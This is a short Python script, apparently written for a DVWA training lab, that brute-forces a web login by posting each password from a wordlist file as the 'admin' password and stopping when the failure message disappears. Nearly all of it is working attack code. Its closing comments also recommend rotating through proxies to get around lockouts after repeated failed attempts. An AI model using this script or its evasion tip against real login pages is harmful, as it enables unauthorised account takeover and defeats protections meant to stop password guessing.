#!/usr/bin/env python
import requests

target_url= "http://10.1.1.210/dvwa/login.php"

data_dict = {"username": "admin", "password": "", "Login": "submit"}           #creating a dictionary variable.           #these information can be gathered from the inspect element window of the target page.
                                                                            #username and the login action attribute needs to be hardcoded within the line.
with open("/root/Downloads/passwords.txt", "r") as wordlist_file:        #input an absolute path of the wordfile of the password file.
    for line in wordlist_file:                                           # iterating over each line in the file
        word = line.strip()                                              # as wordlist has new line character at end of each word; we need to remove that. strip() function is used to do it,
        data_dict["password"] = word                                     #assigning the password as a word from the passwords.txt[wordlist]
        response = requests.post(target_url, data=data_dict)            #post requests is used to send the data to the webpage.

        if "Login failed" not in response.content:
            print("[+] Got the password -->" +word)
            exit()
print("[+] reached the end of line in wordlist and password not found")

#while trying some webpages can have firewalls. 10 failed attempts disables.
#use proxies to try from different ip.